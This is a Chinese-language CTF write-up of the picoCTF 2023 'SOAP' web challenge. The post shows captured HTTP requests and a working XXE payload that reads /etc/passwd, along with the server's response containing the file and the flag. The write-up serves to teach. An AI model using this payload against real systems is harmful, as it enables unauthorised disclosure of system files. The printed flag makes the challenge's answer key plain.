{"title":"SOAP - writeup","date":"2024-07-25T12:59:00.000Z","date_formatted":{"ll":"Jul 25, 2024","L":"07/25/2024","MM-DD":"07-25"},"author":"plusC","link":"SOAP-writeup","comments":true,"tags":["Web","picoCTF","picoCTF 2023"],"categories":["picoCTF"],"updated":"2024-07-26T16:18:38.797Z","content":"<h2 id=\"題目\">題目<a title=\"#題目\" href=\"#題目\"></a></h2>\n<p><img src=\"/images/pasted-34.png\" alt=\"upload successful\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"解題過程\">解題過程<a title=\"#解題過程\" href=\"#解題過程\"></a></h2>\n<p>題目說因為網頁沒有做安全評估，問我們有沒有辦法拿到 <code>/etc/passwd</code><br>\n本來想說應該是 directory traversal<br>\n結果好像不是<br>\n想了一下沒有頭緒就看了提示：</p>\n<p><img src=\"/images/pasted-35.png\" alt=\"upload successful\" loading=\"lazy\" class=\"φbp\"></p>\n<p>提示說是 XXE (XML external entity Injection)<br>\n超出知識範圍了，去惡補一下zzz</p>\n<p>惡補完後回到網頁<br>\n可以發現每個 Detail button 上面都有一個隱藏的 input<br>\n<img src=\"/images/pasted-36.png\" alt=\"upload successful\" loading=\"lazy\"></p>\n<p>把 input 的 hidden 刪掉後就可以看到原本隱藏的輸入框了</p>\n<p><img src=\"/images/pasted-37.png\" alt=\"upload successful\" loading=\"lazy\" class=\"φbp\"></p>\n<p>從程式碼中同時也可以發現 Details button 其實也就是表單的 submit button</p>\n<p>將表單送出後用 Burp Suite 抓下來：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /data HTTP/1.1</span><br><span class=\"line\">Host: saturn.picoctf.net:49566</span><br><span class=\"line\">Content-Length: 61</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span><br><span class=\"line\">Content-Type: application/xml</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Origin: http://saturn.picoctf.net:49566</span><br><span class=\"line\">Referer: http://saturn.picoctf.net:49566/</span><br><span class=\"line\">Accept-Encoding: gzip, deflate, br</span><br><span class=\"line\">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">  &lt;data&gt;</span><br><span class=\"line\">    &lt;ID&gt;1&lt;/ID&gt;</span><br><span class=\"line\">  &lt;/data&gt;</span><br></pre></td></tr></table></figure>\n<p>可以看到表單內容是用 XML 格式送出<br>\n所以把請求新增自定義的 Entity 去將本機的密碼輸出</p>\n<p><code>&lt;!DOCTYPE xxe [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;</code>：定義了一個名為 xxe 的外部實體，指向本地文件系統的 /etc/passwd 文件</p>\n<p><code>&lt;data&gt; &lt;ID&gt;&amp;xxe;&lt;/ID&gt; &lt;/data&gt;</code>：根元素 <code>&lt;data&gt;</code> 包含子元素 <code>&lt;ID&gt;</code>，其中引用了 <code>&amp;xxe;</code> 實體</p>\n<p>如果伺服器使用的 XML 解析器允許外部實體解析，那麼 &amp;xxe; 實體將會被替換成 /etc/passwd 文件的內容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /data HTTP/1.1</span><br><span class=\"line\">Host: saturn.picoctf.net:49566</span><br><span class=\"line\">Content-Length: 131</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span><br><span class=\"line\">Content-Type: application/xml</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Origin: http://saturn.picoctf.net:49566</span><br><span class=\"line\">Referer: http://saturn.picoctf.net:49566/</span><br><span class=\"line\">Accept-Encoding: gzip, deflate, br</span><br><span class=\"line\">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE xxe [</span><br><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class=\"line\">&lt;data&gt;&lt;ID&gt;&amp;xxe;&lt;/ID&gt;&lt;/data&gt;</span><br></pre></td></tr></table></figure>\n<p>就可以成功拿到 flag 啦：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Server: Werkzeug/2.3.6 Python/3.8.10</span><br><span class=\"line\">Date: Thu, 25 Jul 2024 13:23:45 GMT</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br><span class=\"line\">Content-Length: 1023</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">Invalid ID: root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">flask:x:999:999::/app:/bin/sh</span><br><span class=\"line\">picoctf:x:1001:picoCTF&#123;XML_3xtern@l_3nt1t1ty_0e13660d&#125;</span><br></pre></td></tr></table></figure>\n<p>picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}</p>\n<h2 id=\"參考資料\">參考資料<a title=\"#參考資料\" href=\"#參考資料\"></a></h2>\n<p><a href=\"https://www.digicentre.com.tw/industry_detail?id=38\" target=\"_blank\">https://www.digicentre.com.tw/industry_detail?id=38</a></p>\n","prev":{"title":"More SQLi - writeup","link":"More-SQLi-writeup"},"next":{"title":"Bookmarklet - writeup","link":"Bookmarklet-writeup"},"plink":"https://pluscat.me/SOAP-writeup/","toc":[{"id":"題目","title":"題目","index":"1"},{"id":"解題過程","title":"解題過程","index":"2"},{"id":"參考資料","title":"參考資料","index":"3"}],"reading_time":"858 words in 6 min"}